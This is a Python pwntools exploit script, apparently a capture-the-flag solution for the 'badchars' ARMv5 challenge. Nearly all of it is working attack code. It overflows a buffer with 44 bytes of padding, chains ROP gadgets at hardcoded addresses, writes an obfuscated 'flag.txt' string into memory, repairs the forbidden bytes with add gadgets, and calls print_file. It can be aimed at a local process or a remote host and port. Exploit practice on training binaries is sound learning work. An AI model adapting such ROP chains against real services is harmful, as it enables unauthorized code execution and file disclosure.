from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./badchars_armv5")


"""
Bad Characters:
            *   *   *       *
    f   l   a   g   .   t   x   t
    66  6c  61  67  2e  74  78  74
    f   l   `   f   -   t   w   t
"""


class ROPS:
    pop_r3    = 0x00010690  # pop {r3, pc};
    pop_r4    = 0x000105b0  # pop {r4, pc};
    pop_r5_r6 = 0x00010614  # pop {r5, r6, pc};
    ld_add    = 0x00010600  # ldr r1, [r5]; add r1, r1, r6; str r1, [r5]; pop {r0, pc}; 
    str_wd    = 0x00010610  # str r3, [r4]; pop {r5, r6, pc}; 


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(44)

    payload = [
        padding,
        ROPS.pop_r3,
        b"fl`f",
        ROPS.pop_r4,
        elf.sym.data_start,
        ROPS.str_wd,
        elf.sym.data_start,  # ` -> a
        0x01010000,
        ROPS.ld_add,
        0xDEADBEEF,
        ROPS.pop_r3,
        b"-twt",
        ROPS.pop_r4,
        elf.sym.data_start + 4,
        ROPS.str_wd,
        elf.sym.data_start + 4,
        0x00010001,
        ROPS.ld_add,
        elf.sym.data_start,
        elf.plt.print_file
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()